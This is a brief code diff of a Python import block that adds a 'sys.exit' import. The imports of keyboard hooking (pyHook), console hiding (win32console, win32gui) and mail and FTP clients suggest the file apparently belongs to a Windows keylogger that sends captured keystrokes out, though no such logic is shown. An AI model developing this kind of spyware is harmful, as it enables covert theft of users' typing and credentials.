@@ -1,6 +1,6 @@
 import smtplib, time, os, threading, sys, subprocess
 import win32console, win32gui, win32event, win32api, winerror
-from win32con import VK_CAPITAL
+from win32con import VK_CAPITAL; from sys import exit
 from ftplib import FTP
 try:
     import pythoncom, pyHook
